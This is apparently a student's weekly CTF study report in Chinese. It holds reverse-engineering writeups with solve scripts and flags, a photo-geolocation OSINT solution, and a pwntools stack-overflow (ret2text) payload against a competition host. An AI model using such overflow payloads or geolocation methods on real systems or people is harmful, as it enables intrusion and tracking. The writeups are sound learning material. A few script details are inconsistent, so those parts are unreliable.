# hanafuda_store的周报(第十周)
## 刷题
### [LitCTF 2023]debase64
IDA分析可以看到以下反汇编代码
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _BYTE decode[14]; // [esp+10h] [ebp-44h] BYREF
  char v5; // [esp+1Eh] [ebp-36h]
  char v6; // [esp+20h] [ebp-34h]
  __int16 v7; // [esp+21h] [ebp-33h]
  __int16 v8; // [esp+23h] [ebp-31h]
  __int16 v9; // [esp+25h] [ebp-2Fh]
  __int16 v10; // [esp+27h] [ebp-2Dh]
  __int16 v11; // [esp+29h] [ebp-2Bh]
  __int16 v12; // [esp+2Bh] [ebp-29h]
  char v13; // [esp+2Dh] [ebp-27h]
  char v14; // [esp+2Eh] [ebp-26h]
  char input[20]; // [esp+3Ch] [ebp-18h] BYREF

  sub_402290();
  puts(&Buffer);                                // “请开始你的表演”
  memset(decode, 0, sizeof(decode));
  v5 = 0;
  memset(input, 0, sizeof(input));
  scanf("%s", input);
  if ( strlen(input) != 20 )
  {
    puts(&byte_404053);
    return 0;
  }
  v6 = 0x46;
  v7 = 0x18ED;
  v8 = 0x5696;
  v9 = 0xD29E;
  v10 = 0xB272;
  v11 = 0x80B3;
  v12 = 0xFF70;
  v13 = 0;
  v14 = 0;
  base64_encode(input, (int)decode);
  if ( v6 != decode[0]
    || v7 != *(_WORD *)&decode[1]
    || v8 != *(_WORD *)&decode[3]
    || v9 != *(_WORD *)&decode[5]
    || v10 != *(_WORD *)&decode[7]
    || v11 != *(_WORD *)&decode[9]
    || v12 != *(_WORD *)&decode[11]
    || v13 != decode[13]
    || v14 != v5 )
  {
    puts(&byte_40405E);
    return 0;
  }
  return puts(&byte_404065);
}
```
经分析，该函数是在检查输入的内容进行Base64解密后与对应的内容是否一致

注意数据是以小端序存储的

exp：
```python
import base64
list = [0x46, 0xED, 0x18, 0x96, 0x56, 0x9E, 0xD2, 0x72, 0xB2, 0xB3, 0x80, 0x70]
# 此处用python的字符串进行处理较好，若先将数据转为ASCII字符再用在线网站加密，则非ASCII字符将无法正常显示，也无法被正确的转换
list_b = bytes(list)
print(base64.b64encode(list_b))
# Ru0Yllae0nKys4Bw 需调整字符顺序
# Y0uReallyKn0wB4s
```
```python
# 根据题目信息提示进行md5爆破
import hashlib
key = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
for i in key:
    str1 = "Y0uReallyKn0wB4s" + i + "==="
    if hashlib.md5(str1.encode('utf-8')).hexdigest() == "5a3ebb487ad0046e52db00570339aace":
        print(str1)
        break
```
注意flag有20位，最后三位为===，有一位需爆破，故base64加密阶段所得为16个字符
### [FSCTF 2023]signin
![](https://a1.qpic.cn/psc?/V11300AO0tdWfu/LiySpxowE0yeWXwBdXN*SRUnnIkvdv1fDbguOgc3DWz7.VnkUPEuAu8fGx92ojx2j4Vi12ffn7miBAsN3VZWPIY6xEYc6isfrrPmRGImozI!/b&ek=1&kp=1&pt=0&bo=XQMPBF0DDwQDFzI!&tl=1&vuin=934483106&tm=1737936000&dis_t=1737937106&dis_k=646757be8b40668ac5b9ddd3684794dd&sce=60-2-2&rf=viewer_4)
C++逆向，UPX先脱个壳，是在替换给出的明文flag中的字符

得到flag为FSCTF{it_is_really_obvious_to_find}
### [HDCTF 2023]fake_game
正确的uncompyle6的使用指令
```bash
python uncompyle6.exe game.pyc
```
该程序用pycdc解包有误，必须用uncompyle6解包，解包后可知是植物大战僵尸游戏

核心flag输出部分如下：
```python
    def start_game(self):
        global GAMEOVER
        xorr = [
         0] * 4
        ans = [0] * 55
        flag = [178868, 188, 56953, 2413, 178874, 131, 56957, 2313, 178867, 156,
         56933, 2377, 178832, 202, 56899, 2314, 178830, 167, 56924,
         2313, 178830, 167, 56938, 2383, 178822, 217, 56859, 2372]
        self.init_window()
        self.init_plant_points()
        self.init_map()
        self.init_zombies()
        while not GAMEOVER:
            MainGame.window.fill((255, 255, 255))
            MainGame.window.blit(self.draw_text("当前钱数$: {}".format(MainGame.money), 26, (255,
                                                                                         0,
                                                                                         0)), (500,
                                                                                               40))
            MainGame.window.blit(self.draw_text("当前关数{}，得分{},距离下关还差{}分".format(MainGame.shaoguan, MainGame.score, MainGame.remnant_score), 26, (255,

                        0,

                        0)), (5,

                              40))
            self.load_help_text()
            xorr[0] = MainGame.money
            xorr[1] = MainGame.shaoguan
            xorr[2] = MainGame.score
            xorr[3] = MainGame.remnant_score
            if xorr[0] * 256 - xorr[1] / 2 + xorr[2] * 23 + xorr[3] / 2 == 47118166:
                if xorr[0] * 252 - xorr[1] * 366 + xorr[2] * 23 + xorr[3] / 2 - 1987 == 46309775:
                    if xorr[0] * 6 - xorr[1] * 88 + xorr[2] / 2 + xorr[3] / 2 - 11444 == 1069997:
                        if (xorr[0] - 652) * 2 - xorr[1] * 366 + xorr[2] * 233 + xorr[3] / 2 - 13333 == 13509025:
                            for i in range(len(flag)):
                                ans[i] = flag[i] ^ xorr[i % 4]
                            else:
                                with open("flag.txt", "w") as f:
                                    f.write("".join([chr(a) for a in ans]))
```
先用z3解方程得xorr，再与flag数组依次异或输出即可,此处题目不太严谨，在进行z3解密时，解出来的是2360，但实际结果应是2360,这是因为z3在Int类型中，会对数据进行一些截断的位操作，这就导致最后的结果有差异,若能使用位运算则效果更佳

exp:
```python
from z3 import *

# 初始化z3求解器
solver = Solver()

# 定义xorr数组的4个变量
xorr0, xorr1, xorr2, xorr3 = Ints('xorr0 xorr1 xorr2 xorr3')

# 定义flag数组
flag = [178868, 188, 56953, 2413, 178874, 131, 56957, 2313, 178867, 156,
         56933, 2377, 178832, 202, 56899, 2314, 178830, 167, 56924,
         2313, 178830, 167, 56938, 2383, 178822, 217, 56859, 2372]

# 设置约束条件
solver.add(xorr0 * 256 - xorr1 / 2 + xorr2 * 23 + xorr3 / 2 == 47118166)
solver.add(xorr0 * 252 - xorr1 * 366 + xorr2 * 23 + xorr3 / 2 - 1987 == 46309775)
solver.add(xorr0 * 6 - xorr1 * 88 + xorr2 / 2 + xorr3 / 2 - 11444 == 1069997)
solver.add((xorr0 - 652) * 2 - xorr1 * 366 + xorr2 * 233 + xorr3 / 2 - 13333 == 13509025)

# 尝试求解
if solver.check() == sat:
    model = solver.model()
    
    # 获取解
    xorr_values = [model[xorr0].as_long(), model[xorr1].as_long(), model[xorr2].as_long(), model[xorr3].as_long()]
    
    # 输出结果
    print("xorr values:", xorr_values)
    
    # 根据解算出flag
    ans = []
    for i in range(len(flag)):
        ans.append(flag[i] ^ xorr_values[i % 4])

    # 输出flag
    flag_result = ''.join([chr(a) for a in ans])
    print("Flag:", flag_result)
else:
    print("No solution found.")
# 输出为HDCUF{G1Od_ql2y2r_f1r_Pwz!!|
# 正确结果应为HDCTF{G0Od_pl2y3r_f0r_Pvz!!}
# 每四位会错异或一位
```
### Checker
打开程序，发现main函数，阅读代码可知该程序是在接收输入然后再对其进行检查

![](http://m.qpic.cn/psc?/V52mtLJJ3HJION2p4keN1yJtcH3fCpcu/LiySpxowE0yeWXwBdXN*SUd3ShREXWmM1t5s.cqZp.DZCPpMYnccrNG7WFwn0OBnt4uPFcoG8uq1nFyWo4tGsy4GQIbEchqvOcGY9xzv6Yg!/b&bo=GwNPARsDTwEDByI!&rf=viewer_4)

点开check_flag函数及其中的encrypt_flag函数即可看到加密过程核心代码

![](http://m.qpic.cn/psc?/V52mtLJJ3HJION2p4keN1yJtcH3fCpcu/LiySpxowE0yeWXwBdXN*SQH8QFoEU3SfZMwAzi2eiCvflGK0zfgCxgM9tGnUYp1YrUeGU3lKafK0L6Kdz8rOpbQb4pTa3CalFxVd.oAYrQk!/b&bo=ZgIGAWYCBgEDFzI!&rf=viewer_4)

由此可编写exp：
```python
def decrypt_flag(ciphertext, key):
    # 对密文中的每个字节进行异或解密
    decrypted = ''.join(chr(byte ^ key) for byte in ciphertext)
    return decrypted

# 密文
ciphertext = [
    0x72, 0x6b, 0x60, 0x77, 0x65, 0x58, 0x46, 0x46, 0x15, 0x40, 0x14, 0x41, 0x1a, 0x40, 0x0e, 0x46,
    0x14, 0x45, 0x16, 0x0e, 0x17, 0x45, 0x42, 0x41, 0x0e, 0x1a, 0x41, 0x47, 0x45, 0x0e, 0x46, 0x42,
    0x13, 0x14, 0x46, 0x13, 0x10, 0x17, 0x45, 0x15, 0x42, 0x16, 0x5e
]

# 密钥（XOR 值）
key = 0x23

# 解密
flag = decrypt_flag(ciphertext, key)
print("Decrypted flag:", flag)
# QHCTF{ee6c7b9c-e7f5-4fab-9bdf-ea07e034f6a5}
```

### rainbow
IDA分析程序可知加密的核心数据在hide_flag()处
![](http://m.qpic.cn/psc?/V52mtLJJ3HJION2p4keN1yJtcH3fCpcu/LiySpxowE0yeWXwBdXN*SeJCH0PQelwvSPZ12LSlNei0bRyQSqK6SNkoBDl72VwYcMZLXdyNObQTdlnjmS.tP7CL5XOUPtC8zF*IWlehZ0o!/b&bo=UwSJAlMEiQIDFzI!&rf=viewer_4)
点开可以看到其在对一个样例flag进行加密
![](http://m.qpic.cn/psc?/V52mtLJJ3HJION2p4keN1yJtcH3fCpcu/LiySpxowE0yeWXwBdXN*SQCFF3zxH5esKd5G4i7Cmn8ulKj5o6n.jcLFfh7*QgUioUY72WOj6I98icmuAi8EadbSey63JzlmeEkaRY3VmoY!/b&bo=lgKcAZYCnAEDFzI!&rf=viewer_4)
由此我们可以编写exp，并将附件中的密文替换掉原程序中的flag进行加密，即可得到flag，exp如下所示
```python
def xor_decrypt(encrypted_hex, key):
    encrypted_bytes = bytes.fromhex(encrypted_hex)
    decrypted = ''.join(chr(b ^ key) for b in encrypted_bytes)
    return decrypted
encrypted_hex = "0B12190E1C213B6268686C6B6A69776F3B633B776E3C3B6D773B38393C773E3F3B6E69623B6D393F6D6227"
key = 0x5A
print(xor_decrypt(encrypted_hex, key))
# QHCTF{a8226103-5a9a-4fa7-abcf-dea438a7ce78}
```
### 小明的note
这个程序的逻辑是先把系统内储存的密文解密再和输入的内容比较，与平常遇到的加密输入内容再和存储的密文比较的题有所不同。此题只需将解密的decrypt_flag函数复制下来，编写一个main函数调用其并完成对密文解密结果的输出。
![](http://m.qpic.cn/psc?/V52mtLJJ3HJION2p4keN1yJtcH3fCpcu/LiySpxowE0yeWXwBdXN*SakmlX9AKx7rCfqHjsbpX8bXHeDe8zrXw3qpc91ooXeMbvvzmjLMgrwwBrmlDEMvJBx48TjCHYtlfvYbUCu94Zc!/b&bo=LgO7AS4DuwEDByI!&rf=viewer_4)
由此可编写exp：
```C
#include <stdio.h>
#include <string.h>

__int64 decrypt_flag(char* dest, __int64 a2) {
    size_t v2; // rcx
    __int64 result; // rax
    __int64 v4; // [rsp+0h] [rbp-30h]
    int i; // [rsp+18h] [rbp-18h]
    int v6; // [rsp+1Ch] [rbp-14h]
    __int64 v7; // [rsp+20h] [rbp-10h]
    char* s; // [rsp+28h] [rbp-8h]

    s = dest;
    v7 = a2;
    v6 = 2090940226; // 密钥
    for (i = 0; i < strlen(s); ++i) {
        *((unsigned char*)(v7 + i)) = *((unsigned char*)&v6 + i % 4) ^ s[i]; // 第一次 XOR
        *((unsigned char*)(v7 + i)) ^= (unsigned char)i + 1; // 第二次 XOR
    }
    v4 = v7;
    v2 = strlen(s);
    result = v4;
    *((unsigned char*)(v4 + v2)) = 0; 
    return result;
}

int main() 
{
    unsigned char ciphertext[] = {
        0x12, 0x7d, 0xe1, 0x2c, 0x1, 0x4a, 0xc4, 0x45, 0x78, 0x5e,
        0xc9, 0x46, 0x78, 0x5d, 0x83, 0xf, 0x37, 0x12, 0xd0, 0x45,
        0x63, 0x42, 0xd5, 0x57, 0x76, 0x14, 0xde, 0x6, 0x6e, 0x4,
        0x8f, 0x3e, 0x50, 0x21, 0xe1, 0x3b, 0x53, 0x72, 0xb7, 0x6c,
        0x5d, 0x79, 0xf7
    };
    unsigned char decrypted[sizeof(ciphertext)];
    decrypt_flag((char*)ciphertext, (unsigned long long)decrypted);
    printf("Decrypted flag: ");
    for (int i = 0; i < sizeof(ciphertext); ++i) {
        printf("%c", decrypted[i]);
    }
    printf("\n");

    return 0;
    //QHCTF{b13cc67d-cd7b-4cc3-9df1-1b34cc4c186d}
}
```
### 请找出拍摄地所在位置
在附件的图片中看到了洋丰复合肥、雅迪电动车等店面，以及最左上角新能源汽车广告中的柳城二字即可大致锁定范围，在百度地图和高德地图上深入搜索，即可找到拍摄地
![](http://m.qpic.cn/psc?/V52mtLJJ3HJION2p4keN1yJtcH3fCpcu/LiySpxowE0yeWXwBdXN*SeCTos46*.JdZRo9owk.L*3Stm6iEuoCjrttib6cm3eLtDkYAAxR1M.YcYV.J2mzv7bA0Q9yK0JCh8jPYkDvcEI!/b&bo=ZQSECWUEhAkHByY!&rf=viewer_4)
![](http://m.qpic.cn/psc?/V52mtLJJ3HJION2p4keN1yJtcH3fCpcu/LiySpxowE0yeWXwBdXN*SZ.*Bb1yjkYwPwtTdFEDm4djBw9PJESYCDVTsGtknqh1d72XY79nnzHKWAD.eTbtxGL3juQ4tbkwh5gTPMgQGOo!/b&bo=ZQSECWUEhAkHFzY!&rf=viewer_4)
由此可知flag为QHCTF{广西壮族自治区柳州市柳城县六广路与榕泉路交叉口}
### [CISCN 2019华北]PWN1
一道ret2text题目，其原理是利用栈溢出等漏洞，使程序执行自身存在的危险代码，如
```c
system("cat /flag");
```
用IDA分析附件可得以下内容
![](https://a1.qpic.cn/psc?/V52mtLJJ3HJION2p4keN1yJtcH3fCpcu/LiySpxowE0yeWXwBdXN*SbRcGBu0tTjCpTHe8GDPVjoqQNsBqVvxZk4y*j2LI.9T9qHtGgiMWJPxT4lHTztaGFT57zY4qAIMolGVuds8NKs!/b&ek=1&kp=1&pt=0&bo=lwJ4AZcCeAEDFzI!&tl=1&vuin=934483106&tm=1737936000&dis_t=1737939340&dis_k=aaf0b1271a7c9d3833f4bc8fd5c8a53e&sce=60-2-2&rf=viewer_4)
然后查看栈的部分，发现v2和v1是紧挨着的

gets函数不会限制输入的长度，这也是我们进行攻击的着手点

由此可构造payload：
```python
from pwn import *

p = remote(‘node4.anna.nssctf.cn’, 28456)

payload = b’a’ * (0x30 - 0x4) + p64(0x41348000)

p.sendline(payload)
p.interactive()
```
之后再用cat flag指令获取即可

## 参加启航杯的比赛
解出的题目已补充在上文的writeup中
## 开始学习PWN的内容
作为Re手，学习PWN也是很重要的，在学长的指导下我从ret2text开始着手，了解了栈溢出等概念，在自己的虚拟机上配置了PWN的环境，并做了几道例题，过程已总结在了上面WP部分
## 结束了C++反汇编的学习
将《C++反汇编与逆向分析》一书学习完毕，收获颇丰，对C++的编译过程有了更深的理解
## 复习Python
复习了之前学习Python的一些基础概念，主要是因为隔了太久遗忘的比较多了